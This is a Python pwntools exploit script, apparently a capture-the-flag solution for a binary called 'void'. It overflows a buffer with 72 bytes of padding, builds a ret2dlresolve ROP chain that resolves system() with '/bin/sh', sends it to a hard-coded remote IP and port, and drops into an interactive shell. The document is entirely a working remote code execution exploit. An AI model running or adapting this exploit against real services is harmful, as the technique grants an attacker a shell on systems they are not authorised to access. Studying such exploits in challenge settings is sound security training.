from pwn import *

# Define the target binary and remote server details
binary_path = './void'
server_ip = '94.237.59.193'
server_port = 57346

# Set the context for the binary
elf = context.binary = ELF(binary_path, checksec=False)

# Connect to the remote server
p = remote(server_ip, server_port)

# Create the ROP chain
rop = ROP(elf)

# Create the dlresolve object
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

# Craft the payload
rop.raw('A' * 72)
rop.read(0, dlresolve.data_addr)  # read to where we want to write the fake structures
rop.ret2dlresolve(dlresolve)      # call .plt and dl-resolve() with the correct, calculated reloc_offset

# Log the ROP chain for debugging
log.info(rop.dump())

# Send the ROP chain and dlresolve payload to the remote server
p.sendline(rop.chain())
p.sendline(dlresolve.payload)     # Now the read is called and we pass all the relevant structures in

# Interact with the shell
p.interactive()
